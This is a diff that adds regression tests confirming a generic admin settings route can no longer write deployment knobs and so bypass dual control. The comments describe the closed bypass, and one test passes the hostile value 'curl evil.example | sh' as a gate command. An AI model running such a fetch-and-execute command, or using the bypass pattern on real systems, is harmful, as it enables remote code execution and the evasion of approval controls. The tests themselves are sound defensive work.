@@ -5,7 +5,9 @@ import type { ConfigStore } from "../src/store/configStore";
 import {
   DEPLOYMENT_SCOPE,
   KNOBS,
+  REGISTRY_KEY_PREFIXES,
   deploymentView,
+  isRegistryOwnedKey,
   knobById,
   knobEnabled,
   knobSettingKey,
@@ -14,7 +16,7 @@ import {
 import { settingKey } from "../src/store/schema";
 import { __resetKnownProjectsForTests } from "../src/projects";
 import { __resetUploadRateLimitForTests } from "../src/middleware/rateLimit";
-import { seed, sessionCookieFor } from "./helpers/seed";
+import { seed, seedAccount, sessionCookieFor } from "./helpers/seed";
 
 /**
  * The deployment-settings surface: one screen that shows everything this system
@@ -371,6 +373,112 @@ describe("deploymentView is renderable as-is", () => {
       expect(["toggle", "text", "list", "number"]).toContain(v.kind);
       expect(typeof v.editable).toBe("boolean");
       if (!v.editable) expect(v.notEditable).toBeTruthy();
+    }
+  });
+});
+
+/**
+ * REGRESSION — the bypass this guard exists for, reproduced before it was
+ * fixed and pinned here so it cannot come back.
+ *
+ * `PUT /admin/settings/:key` is the older, generic settings route. It takes its
+ * key straight from the URL and writes `settingKey(callerScope, key)`. A
+ * deployment knob lives at `settingKey(@control, 'deployment.<id>')` — the SAME
+ * row. An admin bound to `*` who sends NO `x-ccp-project` header lands on
+ * `@control` by default, so before the guard they could write a deployment knob
+ * through a route that knows none of its rules:
+ *
+ *   - no editable gate, so the four command-running knobs were writable;
+ *   - NO DUAL CONTROL, because an unrecognised key falls through that route's
+ *     classification chain to "tightening" and applies immediately.
+ *
+ * Measured at the time: the proper route answered 202 and left the scanner
+ * disarmed; the generic route answered 200 and armed it. One admin, no second
+ * approver — exactly the property the deployment screen advertises.
+ */
+describe("registry keys are not writable through the generic settings route", () => {
+  async function starAdmin(s: Setup): Promise<string> {
+    await seedAccount(s.store, {
+      id: "root",
+      role: "lead",
+      teamId: "platform",
+      isAdmin: true,
+      projects: ["*"],
+    });
+    return sessionCookieFor(s.store, "root");
+  }
+
+  /** No `x-ccp-project` header on purpose — that is what puts the caller on
+   * @control, which is where deployment settings live. */
+  async function generic(
+    s: Setup,
+    cookie: string,
+    key: string,
+    value: unknown,
+  ): Promise<Response> {
+    return s.app.request(`/admin/settings/${key}`, {
+      method: "PUT",
+      headers: {
+        cookie,
+        "x-ccp-client": "ccp-spa",
+        "content-type": "application/json",
+      },
+      body: JSON.stringify({ value }),
+    });
+  }
+
+  it("cannot arm the scanner, which is what the bypass actually achieved", async () => {
+    const s = await setup();
+    const root = await starAdmin(s);
+    const res = await generic(s, root, "deployment.scanner.enabled", true);
+    expect(res.status).toBe(422);
+    expect(((await res.json()) as { code: string }).code).toBe("OP_DISABLED");
+    // The whole point: still disarmed.
+    expect(await knobEnabled(s.store, "scanner.enabled")).toBe(false);
+  });
+
+  it("cannot write a command-running knob either", async () => {
+    const s = await setup();
+    const root = await starAdmin(s);
+    const res = await generic(
+      s,
+      root,
+      "deployment.apply.gateCommand",
+      "curl evil.example | sh",
+    );
+    expect(res.status).toBe(422);
+    const k = settingKey(DEPLOYMENT_SCOPE, knobSettingKey("apply.gateCommand"));
+    expect(await s.store.get(k.PK, k.SK)).toBeNull();
+  });
+
+  it("refuses EVERY registry-owned key, including the estate prefix reserved ahead of time", async () => {
+    const s = await setup();
+    const root = await starAdmin(s);
+    for (const prefix of REGISTRY_KEY_PREFIXES) {
+      const res = await generic(s, root, `${prefix}anything.at.all`, true);
+      expect(res.status, prefix).toBe(422);
+    }
+  });
+
+  it("still allows the ordinary per-project settings it was built for", async () => {
+    // The guard must not break the route's real job.
+    const s = await setup();
+    const root = await starAdmin(s);
+    expect((await generic(s, root, "freeze.global", true)).status).toBe(200);
+  });
+
+  it("the predicate matches the prefixes and nothing that merely resembles them", async () => {
+    expect(isRegistryOwnedKey("deployment.scanner.enabled")).toBe(true);
+    expect(isRegistryOwnedKey("estate.timezone")).toBe(true);
+    // Not a false positive: an ordinary key that happens to contain the word.
+    expect(isRegistryOwnedKey("freeze.global")).toBe(false);
+    expect(isRegistryOwnedKey("catalog.deployment.notes")).toBe(false);
+  });
+
+  it("every knob's stored key IS recognised as registry-owned", async () => {
+    // Ties the guard to the registry: add a knob, and it is covered already.
+    for (const k of KNOBS) {
+      expect(isRegistryOwnedKey(knobSettingKey(k.id)), k.id).toBe(true);
     }
   });
 });
